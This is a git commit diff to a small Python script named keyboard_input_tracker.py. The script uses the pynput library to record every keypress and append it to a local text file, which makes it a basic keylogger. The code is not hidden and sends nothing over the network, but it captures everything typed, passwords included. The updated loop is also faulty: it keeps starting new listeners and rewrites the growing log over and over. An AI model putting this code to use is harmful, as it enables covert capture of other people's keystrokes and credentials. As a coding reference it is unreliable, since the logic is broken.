770764774e59b3b960f14fa100942f130c4e6a55
Hemlock Valor <143224038+beano143@users.noreply.github.com>
2023-11-08 15:26:43 -0600

    Update keyboard_input_tracker.py

--- minor_code/keyboard_input_tracker.py
+++ minor_code/keyboard_input_tracker.py
@@ -1,17 +1,33 @@
 from pynput import keyboard
+import time
+
+data = []
 
 def on_press(key):
-    with open ('inputs.txt', 'a') as file:
-        try:
-            file.wright(f'{key.char}')
-        except AttributeError:
-            if key = key.enter:
-                file.write("\n")
-            else:
-                file.write(f'{key}')
-    
+  try:
+    data.append(f'{key.char[0]}')
+  except AttributeError:
+    data.append(f'{key}')
+  return data
+
 def on_release(key):
     pass
-  
-listener = keyboard.Listener(on_press=on_press, on_release=on_release)
-listener.start()
+
+def read_fix_file(data):
+  with open ('inputs.txt', 'a') as file:
+    datal = ""
+    for obj in data:
+      if obj == "Key.enter":
+        datal += '\n'
+      else:
+        datal += obj
+    file.write(datal)
+
+while True:
+  try:
+    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+    listener.start()
+    read_fix_file(data)
+
+  except KeyboardInterrupt as e:
+    read_fix_file(data)
